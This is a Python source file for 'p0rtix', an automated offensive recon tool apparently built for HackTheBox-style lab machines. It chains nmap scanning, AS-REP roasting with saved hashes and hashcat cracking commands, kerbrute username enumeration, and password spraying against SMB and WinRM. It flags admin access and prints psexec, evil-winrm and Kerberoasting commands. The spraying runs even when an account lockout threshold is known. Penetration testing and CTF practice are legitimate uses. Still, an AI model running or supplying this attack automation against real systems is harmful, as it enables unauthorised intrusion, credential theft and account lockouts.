#!/usr/bin/env python3
"""
p0rtix — stealthy, coverage-focused recon and enumeration

Usage:
  sudo python3 p0rtix.py <ip> [--domain DOMAIN] [--name NAME]
                               [--workspace DIR] [--workers N]

Examples:
  sudo python3 p0rtix.py 10.10.11.34
  sudo python3 p0rtix.py 10.10.11.34 --domain test.htb --name lame
  sudo python3 p0rtix.py 10.10.11.34 --domain test.htb --workspace ~/Projects/htb

Requires root for SYN scans (-sS) and /etc/hosts writes.
"""
import argparse
import os
import re
import subprocess
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

from lib.analyze import analyze_findings
from lib.deps import check_deps
from lib.logger import get_logger, setup_logging
from lib.findings import Findings, ServiceBuffer, set_verbose
from lib.hosts import HostsManager
from lib.models import Discovery, Service
from lib.nmap import run_port_discovery, run_service_scan, parse_service_xml
from lib.runner import Runner
from lib.scope import Scope
from lib.services import enumerate_service
from lib.state import ScanState
from lib.web import enumerate_web
from lib.workspace import Workspace

BANNER = r"""
██▓███   ▒█████   ██▀███  ▄▄▄█████▓ ██▓▒███  ██▒
▓██░  ██▒▒██▒  ██▒▓██ ▒ ██▒▓  ██▒ ▓▒▓██▒▒▒ █ █ ▒░
▓██░ ██▓▒▒██░  ██▒▓██ ░▄█ ▒▒ ▓██░ ▒░▒██▒░░  █   ░
▒██▄█▓▒ ▒▒██   ██░▒██▀▀█▄  ░ ▓██▓ ░ ░██░ ░ █ █ ▒
▒██▒ ░  ░░ ████▓▒░░██▓ ▒██▒  ▒██▒ ░ ░██░▒██▒ ▒██▒
▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░  ▒ ░░   ░▓  ▒▒ ░ ░▓ ░
░▒ ░       ░ ▒ ▒░   ░▒ ░ ▒░    ░     ▒ ░░░   ░▒ ░
░░       ░ ░ ░ ▒    ░░   ░   ░       ▒ ░ ░    ░
             ░ ░     ░               ░   ░    ░
by v0idravl
"""


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="p0rtix — automated recon and enumeration",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )

    # Target — mutually exclusive: single IP or targets file
    target_group = p.add_mutually_exclusive_group(required=True)
    target_group.add_argument("ip", nargs="?", help="Target IP address")
    target_group.add_argument("--targets", "-T", metavar="FILE",
                              help="File of targets, one per line: IP [domain [name]]")

    p.add_argument("--domain", "-d", metavar="DOMAIN",
                   help="Primary domain for vhost busting (e.g. test.htb)")
    p.add_argument("--name", "-n", metavar="NAME",
                   help="Machine nickname used for the output directory (default: domain or IP)")
    p.add_argument("--workspace", "-w", metavar="DIR", default=".",
                   help="Root directory for all output (default: current directory)")
    p.add_argument("--workers", type=int, default=6, metavar="N",
                   help="Parallel enumeration threads (default: 6)")
    p.add_argument("--analyze", "-A", action="store_true",
                   help="send findings.md to Claude API for AI analysis (requires ANTHROPIC_API_KEY; use sudo -E to preserve env)")
    p.add_argument("--model", default="claude-sonnet-4-6", metavar="MODEL",
                   help="Claude model for --analyze (default: claude-sonnet-4-6)")
    p.add_argument("--verbose", "-v", action="store_true",
                   help="show inline enumeration notes in findings.md")
    p.add_argument("--deep", action="store_true",
                   help="extended web scanning: cewl wordlist, arjun param discovery, full API bust (slower)")
    p.add_argument("--continue", dest="continue_scan", action="store_true",
                   help="resume a previous scan — skips completed phases (auto-detected if prior scan exists)")
    p.add_argument("--rescan", action="store_true",
                   help="force fresh nmap scans even when prior scan data exists")
    p.add_argument("--mode", default="scan",
                   help="scan = full recon (default); creds = credentialed AD enum; scan,creds = both in one run")
    p.add_argument("-u", "--username", metavar="USER",
                   help="Single username for --mode creds")
    p.add_argument("-p", "--password", metavar="PASS",
                   help="Single password for --mode creds")
    p.add_argument("--creds", metavar="FILE",
                   help="File of username:password pairs (one per line) for --mode creds")
    return p.parse_args()


def _parse_targets_file(path: str) -> list[tuple[str, str | None, str | None]]:
    """
    Parse a targets file into (ip, domain, name) tuples.
    Format per line: IP [domain [name]]
    Lines starting with # and blank lines are ignored.
    """
    targets: list[tuple[str, str | None, str | None]] = []
    for line in open(path).read().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split()
        ip = parts[0]
        domain = parts[1] if len(parts) > 1 else None
        name = parts[2] if len(parts) > 2 else None
        targets.append((ip, domain, name))
    return targets


def _reload_services_from_disk(ws: "Workspace") -> list[Service]:
    """Re-parse service objects from saved nmap XML files (used by --continue)."""
    services: list[Service] = []
    tcp_xml = next(ws.raw_dir.glob("*_tcp_services.xml"), None)
    udp_xml = next(ws.raw_dir.glob("*_udp_confirmed.xml"), None)
    if tcp_xml:
        services.extend(parse_service_xml(tcp_xml, "tcp"))
    if udp_xml:
        services.extend(parse_service_xml(udp_xml, "udp"))
    return services


def _run_single_scan(
    ip: str,
    domain: str | None,
    name: str | None,
    args: argparse.Namespace,
    available: set[str],
) -> dict:
    """
    Full scan pipeline for one target. Returns a summary dict for multi-target reporting.
    Honours --continue to skip port discovery and service scan if state file says they're done.
    """
    ws = Workspace(ip, domain, name, args.workspace,
                   mode="scan" if args.mode == "scan,creds" else args.mode)
    state = ScanState(ws.machine_dir)
    setup_logging(ws.log_dir)
    _log = get_logger()
    _log.info("Target: %s  domain: %s  mode: %s", ip, domain or "none", args.mode)
    findings = Findings(ws.findings_path, ip, domain)
    set_verbose(args.verbose)
    runner = Runner(ws)
    hosts = HostsManager()
    scope = Scope(ip, domain)

    if domain and not hosts.resolves(domain):
        print(f"\n[*] Domain '{domain}' does not resolve.")
        hosts.prompt_add(ip, domain)

    # Auto-use prior scan data if available — no flag needed.
    # --rescan forces fresh nmap even when state exists.
    _use_prior = (not getattr(args, "rescan", False)) and state.has_prior_scan

    print(f"\n[*] Workspace : {ws.machine_dir}")
    print(f"[*] Findings  : {ws.findings_path}")
    print(f"[*] Target    : {ip}" + (f"   Domain: {domain}" if domain else ""))
    if _use_prior:
        print(f"[*] Prior scan : {state.summary()}")
        print(f"[*]            → nmap phases skipped (use --rescan to force fresh scan)")
    elif args.continue_scan and state.exists:
        print(f"[*] Resuming  : {state.summary()}")
    print(f"[*] Workers   : {args.workers}")
    print()

    # ── Creds-only dispatch ───────────────────────────────────────────────────
    if args.mode == "creds":
        from lib.credsmode import load_creds, run_creds_mode
        creds = load_creds(args.username, args.password, args.creds)
        if not creds:
            print("[!] No valid credentials parsed — skipping creds mode for this target")
            return {"ip": ip, "domain": domain, "machine_dir": str(ws.machine_dir), "success": False}

        services: list[Service] = _reload_services_from_disk(ws)
        if not services:
            print("[!] No prior nmap XML found — per-service enumeration will be limited")

        run_creds_mode(ip, domain, creds, services, runner, findings, ws, available)
        findings.finalize()
        if args.analyze:
            analyze_findings(ws, ip, domain, model=args.model, mode="creds")
        _chown(ws)
        _print_loot_summary(ws)
        return {"ip": ip, "domain": domain, "machine_dir": str(ws.machine_dir), "success": True}

    # ── Phase 1: Port discovery ───────────────────────────────────────────────
    if _use_prior or (args.continue_scan and state.is_done("port_discovery")):
        ports = state.get("ports", {"tcp": [], "udp": []})
        print(f"[*] Port discovery: using prior results — TCP {ports['tcp']}  UDP {ports['udp']}")
        findings.h2("Port Discovery")
        findings.note(f"Using prior scan — TCP {ports['tcp']} UDP {ports['udp']}")
    else:
        ports = run_port_discovery(ip, runner, ws, findings)
        if not ports["tcp"] and not ports["udp"]:
            findings.note("No open ports found.")
            print("[!] No open ports found. Exiting.")
            findings.finalize()
            _chown(ws)
            return {"ip": ip, "domain": domain, "machine_dir": str(ws.machine_dir), "success": False}
        state.mark_done("port_discovery", ports=ports)

    # ── Phase 2: Service version scan ─────────────────────────────────────────
    if _use_prior or (args.continue_scan and state.is_done("service_scan")):
        services = _reload_services_from_disk(ws)
        print(f"[*] Service scan: using prior results — {len(services)} service(s) from XML")
        from lib.nmap import write_port_table
        write_port_table(services, findings)
    else:
        services = run_service_scan(ip, ports, runner, ws, findings)
        state.mark_done("service_scan")

    AD_PORTS = {53, 88, 139, 389, 445, 636, 3268, 3269}
    for svc in services:
        if svc.port in AD_PORTS and domain and not svc.hostname:
            svc.hostname = domain
    services = _dedup_services(services)

    # ── Phase 3: Parallel service + web enumeration ───────────────────────────
    # Only skip enumeration on explicit --continue — always re-run when called fresh
    # (e.g. a credentialed follow-up run should still re-enumerate web/services)
    if args.continue_scan and not _use_prior and state.is_done("enumeration"):
        print("[*] Skipping enumeration phase (done)")
        all_discoveries: list[Discovery] = []
    else:
        print(f"\n[*] Starting parallel enumeration ({len(services)} service(s))...")

        web_services   = [s for s in services if s.is_web]
        other_services = [s for s in services if not s.is_web]

        all_discoveries = []
        svc_futures: dict = {}

        with ThreadPoolExecutor(max_workers=args.workers) as pool:
            for svc in web_services:
                buf = ServiceBuffer(svc.port, svc.proto)
                f = pool.submit(
                    enumerate_web,
                    ip, svc, domain, runner, buf, scope, hosts, available,
                    deep=args.deep,
                )
                svc_futures[f] = (buf, f"web:{svc.port}")

            for svc in other_services:
                buf = ServiceBuffer(svc.port, svc.proto)
                f = pool.submit(enumerate_service, ip, svc, runner, buf, available)
                svc_futures[f] = (buf, f"service:{svc.port}")

            for future in as_completed(svc_futures):
                buf, label = svc_futures[future]
                try:
                    result = future.result()
                    if result:
                        all_discoveries.extend(result)
                    print(f"[+] Done: {label}")
                except Exception as exc:
                    print(f"[!] Error in {label}: {exc}")
                    buf.note(f"Enumeration error: {exc}")

        findings.h2("Service Findings")
        for buf, _ in sorted(svc_futures.values(), key=lambda x: (x[0].port, x[0].proto)):
            findings.flush_service_buffer(buf)

        state.mark_done("enumeration")

    # ── Phase 3.5: Post-domain checks ─────────────────────────────────────────
    effective_domain = domain or ws.discovered_domain
    if ws.discovered_domain and not domain:
        print(f"\n[*] Domain discovered: {ws.discovered_domain}")
        if not hosts.resolves(ws.discovered_domain):
            hosts.prompt_add(ip, ws.discovered_domain)

    hostnames_file = ws.loot_dir / "hostnames.txt"
    if hostnames_file.exists():
        for fqdn in hostnames_file.read_text().splitlines():
            fqdn = fqdn.strip()
            if fqdn and not hosts.is_known(fqdn):
                hosts.prompt_add(ip, fqdn)

    _skip_post = args.continue_scan and not _use_prior and state.is_done("post_domain")
    if effective_domain and not _skip_post:
        _run_post_domain_checks(ip, effective_domain, runner, findings, ws, available)
        state.mark_done("post_domain")
    elif _skip_post:
        print("[*] Skipping post-domain checks (done)")

    # ── Phase 3.6: Credential re-use ──────────────────────────────────────────
    creds_file = ws.loot_dir / "creds_found.txt"
    users_file = ws.loot_dir / "users.txt"
    _skip_reuse = args.continue_scan and not _use_prior and state.is_done("cred_reuse")
    if (creds_file.exists() and users_file.exists() and creds_file.stat().st_size > 0
            and not _skip_reuse):
        _run_cred_reuse(ip, runner, findings, ws, services, available)
        state.mark_done("cred_reuse")

    # ── Phase 4: Follow-up on discovered vhosts / SSL SANs ────────────────────
    if not (args.continue_scan and not _use_prior and state.is_done("followup")):
        new_hosts: list[tuple[Discovery, Service]] = []
        for d in all_discoveries:
            if hosts.is_known(d.hostname):
                continue
            if not scope.check(d.hostname):
                print(f"[~] Out of scope — skipping: {d.hostname} (from {d.source})")
                continue
            print(f"\n[*] [{d.type.upper()}] Discovered: {d.hostname}  (via {d.source})")
            if hosts.prompt_add(ip, d.hostname):
                svc = Service(
                    port=d.port, proto="tcp", name=d.scheme,
                    version="", is_web=True, scheme=d.scheme,
                    hostname=d.hostname,
                )
                new_hosts.append((d, svc))

        if new_hosts:
            print(f"\n[*] Follow-up enumeration on {len(new_hosts)} discovered host(s)...")
            followup_futures: dict = {}
            with ThreadPoolExecutor(max_workers=args.workers) as pool:
                for d, svc in new_hosts:
                    buf = ServiceBuffer(svc.port, svc.proto)
                    f = pool.submit(
                        enumerate_web,
                        ip, svc, domain, runner, buf, scope, hosts, available,
                        is_followup=True, deep=args.deep,
                    )
                    followup_futures[f] = (buf, d.hostname)

                for future in as_completed(followup_futures):
                    buf, label = followup_futures[future]
                    try:
                        future.result()
                        print(f"[+] Done: {label}")
                    except Exception as exc:
                        print(f"[!] Error in followup {label}: {exc}")
                        buf.note(f"Enumeration error: {exc}")

            findings.h2("Discovered Hosts")
            for buf, _ in sorted(followup_futures.values(),
                                 key=lambda x: (x[0].port, x[0].proto)):
                findings.flush_service_buffer(buf)

        state.mark_done("followup")

    # ── Loot summary in findings ───────────────────────────────────────────────
    users_file = ws.loot_dir / "users.txt"
    creds_file = ws.loot_dir / "creds_found.txt"
    user_count = (sum(1 for _ in users_file.open())
                  if users_file.exists() and users_file.stat().st_size > 0 else 0)
    cred_count = (sum(1 for _ in creds_file.open())
                  if creds_file.exists() and creds_file.stat().st_size > 0 else 0)
    if user_count or cred_count:
        findings.h2("Loot")
        if user_count:
            findings.bullet(f"**{user_count} unique user(s)** — `{users_file}`")
        if cred_count:
            findings.bullet(f"**{cred_count} credential(s)** — `{creds_file}`")

    # ── searchsploit ───────────────────────────────────────────────────────────
    if "searchsploit" in available:
        nmap_xml = ws.raw_dir / "04_tcp_services.xml"
        if nmap_xml.exists():
            findings.h2("Exploit References (searchsploit)")
            cmd = ["searchsploit", "--nmap", str(nmap_xml)]
            out = runner.run(cmd, "searchsploit_nmap")
            findings.cmd(" ".join(cmd))
            _write_searchsploit(out, findings)
            findings.note(
                "To view a specific exploit: `searchsploit -x <EDB-ID>` | "
                "To copy to CWD: `searchsploit -m <EDB-ID>`"
            )

    # ── Combined mode: credentialed phase after scan ───────────────────────────
    if args.mode == "scan,creds":
        from lib.credsmode import load_creds, run_creds_mode
        creds_list = load_creds(args.username, args.password, args.creds)
        if creds_list:
            print(f"\n[*] Combined mode: starting credentialed phase as {creds_list[0][0]}...")
            run_creds_mode(ip, domain, creds_list, services, runner, findings, ws, available)
        else:
            print("[!] Combined mode: no valid credentials — skipping creds phase")

    # ── Wrap up ────────────────────────────────────────────────────────────────
    state.mark_done("complete")
    findings.finalize()
    if args.analyze:
        analyze_findings(ws, ip, domain, model=args.model)

    _chown(ws)
    _print_loot_summary(ws)
    print(f"[+] Findings  : {ws.findings_path}")
    print(f"[+] Raw data  : {ws.raw_dir}/")
    print(f"[+] Loot      : {ws.loot_dir}/")
    print("─" * 60)

    return {
        "ip": ip, "domain": domain or "",
        "machine_dir": str(ws.machine_dir),
        "success": True,
        "users": user_count,
        "creds": cred_count,
    }


def main():
    print(BANNER)
    args = parse_args()

    if os.geteuid() != 0:
        print("[!] p0rtix requires root — re-run with: sudo python3 p0rtix.py ...")
        sys.exit(1)

    _VALID_MODES = {"scan", "creds", "scan,creds"}
    if args.mode not in _VALID_MODES:
        sys.exit(f"[!] Invalid --mode '{args.mode}'. Choose: scan | creds | scan,creds")

    _needs_creds = args.mode in ("creds", "scan,creds")
    if _needs_creds and not args.username and not args.creds:
        sys.exit("[!] --mode creds/scan,creds requires -u/-p or --creds <file>")
    if _needs_creds and not args.domain and not args.targets:
        print("[!] Warning: --domain not set; AD tools will have limited scope")

    available = check_deps()

    # ── Multi-target mode ─────────────────────────────────────────────────────
    if args.targets:
        targets = _parse_targets_file(args.targets)
        if not targets:
            sys.exit(f"[!] No valid targets found in {args.targets}")

        print(f"[*] Multi-target: {len(targets)} target(s) loaded from {args.targets}")
        results: list[dict] = []

        for i, (ip, file_domain, file_name) in enumerate(targets, 1):
            domain = file_domain or args.domain
            name   = file_name   or args.name
            sep = "═" * 60
            print(f"\n{sep}")
            print(f"  TARGET {i}/{len(targets)}: {ip}" + (f"  ({domain})" if domain else ""))
            print(sep)
            try:
                result = _run_single_scan(ip, domain, name, args, available)
            except KeyboardInterrupt:
                print(f"\n[!] Interrupted on {ip} — moving to next target")
                result = {"ip": ip, "domain": domain or "", "success": False,
                          "machine_dir": "", "users": 0, "creds": 0}
            except Exception as exc:
                print(f"[!] Scan failed for {ip}: {exc}")
                result = {"ip": ip, "domain": domain or "", "success": False,
                          "machine_dir": "", "users": 0, "creds": 0}
            results.append(result)

        _print_multi_summary(results)
        return

    # ── Single-target mode ────────────────────────────────────────────────────
    if not args.ip:
        sys.exit("[!] Provide a target IP or use --targets FILE")

    _run_single_scan(args.ip, args.domain, args.name, args, available)


def _chown(ws: "Workspace"):
    """Return ownership of output directory to the calling user (undoes sudo's root ownership)."""
    sudo_user = os.environ.get("SUDO_USER")
    if sudo_user:
        subprocess.run(["chown", "-R", f"{sudo_user}:", str(ws.machine_dir)],
                       capture_output=True)


def _print_multi_summary(results: list[dict]):
    W = 70
    print(f"\n{'═' * W}")
    print("  MULTI-TARGET SUMMARY")
    print(f"{'═' * W}")
    print(f"  {'IP':<20} {'Domain':<25} {'Users':>5} {'Creds':>5}  Status")
    print(f"  {'-'*20} {'-'*25} {'-'*5} {'-'*5}  {'-'*8}")
    for r in results:
        status = "done" if r.get("success") else "FAILED"
        ip     = r.get("ip", "")
        domain = r.get("domain", "") or ""
        users  = r.get("users", 0)
        creds  = r.get("creds", 0)
        print(f"  {ip:<20} {domain:<25} {users:>5} {creds:>5}  {status}")
        if r.get("machine_dir"):
            print(f"    → {r['machine_dir']}/findings.md")
    print()


def _run_post_domain_checks(
    ip: str, domain: str, runner: Runner,
    findings: Findings, ws: Workspace, available: set[str],
):
    """
    Domain-gated checks that require the complete users.txt assembled
    across all parallel handlers (LDAP + SMB + enum4linux-ng).
    Runs sequentially after phase 3 so the user list is final.
    """
    users_file = ws.loot_dir / "users.txt"
    if not users_file.exists() or users_file.stat().st_size == 0:
        return

    findings.h2("Post-Enumeration: Domain Checks")
    findings.bullet(f"Domain: `{domain}` — user list: `{users_file}` ({sum(1 for _ in users_file.open())} accounts)")

    # AS-REP roasting — full user list, catches accounts LDAP UAC flag missed
    if "impacket-GetNPUsers" in available:
        cmd = [
            "impacket-GetNPUsers", f"{domain}/",
            "-no-pass", "-dc-ip", ip,
            "-request", "-format", "hashcat",
            "-usersfile", str(users_file),
        ]
        findings.cmd(" ".join(cmd))
        out = runner.run(cmd, "post_GetNPUsers", timeout=120)
        if "$krb5asrep$" in out:
            findings.bullet("**AS-REP roastable hash(es) found — crack with: `hashcat -m 18200`**")
            findings.code_block(out.strip())
            hash_file = ws.loot_dir / "asrep.hash"
            with open(hash_file, "a") as hf:
                for line in out.splitlines():
                    if "$krb5asrep$" in line:
                        hf.write(line.strip() + "\n")
            findings.bullet(f"**Hash saved:** `{hash_file}` — `hashcat -m 18200 {hash_file} /usr/share/wordlists/rockyou.txt`")
            findings.add_summary(f"**AS-REP hash(es) in `loot/asrep.hash`** — crack: `hashcat -m 18200`")

    # Kerbrute username validation against the discovered user list
    if "kerbrute" in available:
        cmd2 = ["kerbrute", "userenum", "--dc", ip, "-d", domain, str(users_file)]
        findings.cmd(" ".join(cmd2))
        out2 = runner.run(cmd2, "post_kerbrute_userenum", timeout=300)
        valid = re.findall(r"VALID USERNAME:\s+(\S+)", out2)
        if valid:
            findings.bullet(f"**kerbrute confirmed ({len(valid)} valid):** {', '.join(valid)}")

    findings.note(
        f"Kerberoasting (needs creds): "
        f"`impacket-GetUserSPNs {domain}/USER:PASS -dc-ip {ip} -request -outputfile spns.txt`"
    )


def _run_cred_reuse(
    ip: str, runner: Runner, findings: Findings,
    ws: Workspace, services: list[Service], available: set[str],
):
    """
    Spray each password from loot/creds_found.txt against SMB and WinRM
    using the full loot/users.txt list.  Respects the discovered lockout
    threshold: warns when > 0, proceeds freely when 0 or unknown.
    """
    creds_file = ws.loot_dir / "creds_found.txt"
    users_file = ws.loot_dir / "users.txt"
    passwords = [l.strip() for l in creds_file.read_text().splitlines() if l.strip()]
    if not passwords:
        return

    findings.h2("Credential Re-use")

    threshold = ws.lockout_threshold
    if threshold == 0:
        findings.bullet("**No account lockout — spraying all discovered passwords**")
    elif threshold > 0:
        findings.note(
            f"**Lockout threshold: {threshold}** — spraying one password at a time; "
            "monitor for lockouts"
        )
    else:
        findings.bullet("Lockout policy unknown — spraying cautiously (one password at a time)")

    open_tcp = {s.port for s in services if s.proto == "tcp"}

    for password in passwords:
        if "nxc" not in available:
            break

        if 445 in open_tcp:
            cmd = [
                "nxc", "smb", ip,
                "-u", str(users_file), "-p", password,
                "--continue-on-success",
            ]
            out = runner.run(cmd, f"cred_smb_{re.sub(r'[^a-z0-9]', '_', password.lower())[:16]}", timeout=120)
            findings.cmd(" ".join(cmd))
            for line in out.splitlines():
                if "[+]" in line:
                    if "Pwn3d!" in line:
                        findings.bullet(f"**ADMIN access via SMB:** `{line.strip()}`")
                        findings.add_summary(f"**Admin SMB shell** with `{password}` — `psexec`/`wmiexec`")
                    else:
                        findings.bullet(f"**Valid SMB credential:** `{line.strip()}`")
                        findings.add_summary(f"Valid SMB credential: `{password}`")
                    _save_valid_cred(ws, line.strip(), password)

        if 5985 in open_tcp:
            cmd2 = [
                "nxc", "winrm", ip,
                "-u", str(users_file), "-p", password,
                "--continue-on-success",
            ]
            out2 = runner.run(cmd2, f"cred_winrm_{re.sub(r'[^a-z0-9]', '_', password.lower())[:16]}", timeout=120)
            findings.cmd(" ".join(cmd2))
            for line in out2.splitlines():
                if "[+]" in line:
                    findings.bullet(f"**Valid WinRM credential (shell!):** `{line.strip()}`")
                    findings.add_summary(
                        f"**WinRM shell** with `{password}` — "
                        f"`evil-winrm -i {ip} -u USER -p {password}`"
                    )
                    _save_valid_cred(ws, line.strip(), password)


def _print_dir_tree(path, prefix: str = "", max_depth: int = 4, depth: int = 0):
    if depth >= max_depth:
        return
    try:
        entries = sorted(path.iterdir(), key=lambda e: (e.is_file(), e.name))
    except PermissionError:
        return
    for i, entry in enumerate(entries):
        connector = "└── " if i == len(entries) - 1 else "├── "
        print(f"        {prefix}{connector}{entry.name}")
        if entry.is_dir():
            extension = "    " if i == len(entries) - 1 else "│   "
            _print_dir_tree(entry, prefix + extension, max_depth, depth + 1)


def _print_loot_summary(ws: "Workspace"):
    from pathlib import Path

    W = 60
    print(f"\n{'═' * W}")
    print(f"  LOOT SUMMARY")
    print(f"{'═' * W}")

    # Users
    users_path = ws.loot_dir / "users.txt"
    if users_path.exists():
        users = [l.strip() for l in users_path.read_text().splitlines() if l.strip()]
        if users:
            print(f"\n  Users ({len(users)}):")
            for u in users[:20]:
                print(f"        {u}")
            if len(users) > 20:
                print(f"        ... ({len(users) - 20} more in loot/users.txt)")

    # Hashes
    hash_specs = [
        ("kerberoast.hash", "Kerberoast ", 13100),
        ("asrep.hash",      "AS-REP     ", 18200),
        ("ntlm.hash",       "NTLM       ", 1000),
    ]
    hash_lines = []
    for fname, label, mode in hash_specs:
        hp = ws.loot_dir / fname
        if hp.exists():
            count = sum(1 for l in hp.read_text().splitlines() if l.strip())
            if count:
                hash_lines.append((label, count, fname, mode))

    # LAPS hashes from creds_found
    laps_path = ws.loot_dir / "creds_found.txt"
    laps_count = 0
    if laps_path.exists():
        laps_count = sum(1 for l in laps_path.read_text().splitlines()
                         if "LAPS" in l.upper() and l.strip())

    if hash_lines or laps_count:
        print(f"\n  Hashes:")
        for label, count, fname, mode in hash_lines:
            print(f"        {label} ({count})  → loot/{fname}  [hashcat -m {mode}]")
        if laps_count:
            print(f"        LAPS       ({laps_count})  → loot/creds_found.txt")

    # SMB file tree
    smb_root = ws.loot_dir / "creds_smb"
    if smb_root.exists():
        smb_files = list(smb_root.rglob("*"))
        file_count = sum(1 for f in smb_files if f.is_file())
        if file_count:
            print(f"\n  SMB Files ({file_count}):")
            print(f"        loot/creds_smb/")
            _print_dir_tree(smb_root)

    # Credentials
    cred_files = [
        ("valid_creds.txt",  "SMB/WinRM"),
        ("creds_found.txt",  "loot"),
    ]
    cred_lines = []
    for fname, label in cred_files:
        cp = ws.loot_dir / fname
        if cp.exists():
            lines = [l.strip() for l in cp.read_text().splitlines() if l.strip()]
            for l in lines:
                cred_lines.append(f"{l}  ({label})")
    if cred_lines:
        seen = set()
        print(f"\n  Credentials:")
        for cl in cred_lines:
            if cl not in seen:
                seen.add(cl)
                print(f"        {cl}")

    print()


def _save_valid_cred(ws: Workspace, line: str, password: str):
    m = re.search(r"\\(\S+)", line)
    username = m.group(1) if m else "unknown"
    with open(ws.loot_dir / "valid_creds.txt", "a") as f:
        f.write(f"{username}:{password}\n")


def _dedup_services(services: list[Service]) -> list[Service]:
    """
    When sibling ports share the same handler, keep only the primary one.
    The port table in findings still shows all ports; only the handler dispatch is deduped.
    """
    open_tcp = {s.port for s in services if s.proto == "tcp"}
    open_udp = {s.port for s in services if s.proto == "udp"}
    drop: set[tuple[int, str]] = set()

    if 445 in open_tcp and 139 in open_tcp:   # SMB: 445 supersedes 139
        drop.add((139, "tcp"))
    if 389 in open_tcp and 3268 in open_tcp:  # LDAP GC mirrors 389 in single-domain forests
        drop.add((3268, "tcp"))
    if 636 in open_tcp and 3269 in open_tcp:  # LDAPS GC mirrors 636
        drop.add((3269, "tcp"))
    if 88 in open_tcp and 88 in open_udp:     # Kerberos: TCP and UDP hit same handler
        drop.add((88, "udp"))
    if 53 in open_udp and 53 in open_tcp:     # DNS: UDP is primary; TCP rarely adds more
        drop.add((53, "tcp"))

    if not drop:
        return services

    for port, proto in sorted(drop):
        print(f"[*] Dedup: skipping {proto.upper()} {port} (covered by sibling port)")
    return [s for s in services if (s.port, s.proto) not in drop]


_SS_NOISE = re.compile(
    r"Windows\s+(XP|2000|NT\s*4|9[58]|ME)\b|"
    r"\bSolaris\s+\d|\bAIX\s+\d|\bIRIX\s+\d",
    re.IGNORECASE,
)

def _write_searchsploit(output: str, findings: Findings):
    seen: set[str] = set()
    kept: list[str] = []
    for line in output.splitlines():
        s = line.strip()
        if not s:
            continue
        if s.startswith("-") or "Exploit Title" in s or "ShellCodes" in s or "Exploits:" in s:
            continue
        if _SS_NOISE.search(s):
            continue
        key = s.rsplit("|", 1)[-1].strip() if "|" in s else s
        if key in seen:
            continue
        seen.add(key)
        kept.append(s)

    if kept:
        for line in kept[:25]:
            findings.bullet(line)
        if len(kept) > 25:
            findings.note(f"{len(kept) - 25} additional results omitted — run `searchsploit --nmap` manually")


if __name__ == "__main__":
    main()
